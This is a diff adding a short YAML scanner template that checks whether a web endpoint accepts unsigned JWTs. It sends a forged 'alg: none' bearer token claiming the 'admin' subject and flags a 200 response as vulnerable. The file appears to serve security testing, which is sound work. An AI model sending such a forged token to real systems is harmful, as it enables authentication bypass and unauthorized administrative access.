@@ -1,0 +1,16 @@
+id: jwt-none-algorithm-bypass
+brief:
+  title: JWT None Algorithm Signature Bypass
+  by: sxsc
+  level: high
+  about: Tests if JWT endpoint accepts tokens signed with algorithm 'none'.
+  label: [auth, jwt, algorithm, bypass]
+  score: "9.8 CRITICAL"
+moves:
+  - verb: GET
+    to: ["{{BaseURL}}/"]
+    head:
+      Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0."
+    signs:
+      - on: status
+        status: [200]
